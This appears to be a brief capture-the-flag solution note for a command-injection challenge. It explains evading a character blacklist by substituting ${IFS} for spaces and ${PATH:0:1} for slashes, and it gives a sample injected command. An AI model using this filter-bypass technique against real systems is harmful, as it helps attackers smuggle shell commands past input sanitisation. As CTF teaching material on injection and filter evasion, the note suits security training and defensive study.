# SOLUTION - Challenge 04 : env var
With some env var you can substitute characters that are initially blacklisted.
`${IFS}` will replace the `space` and `${PATH:0:1}` will replace the `/`
```
cat${IFS}${PATH:0:1}
```
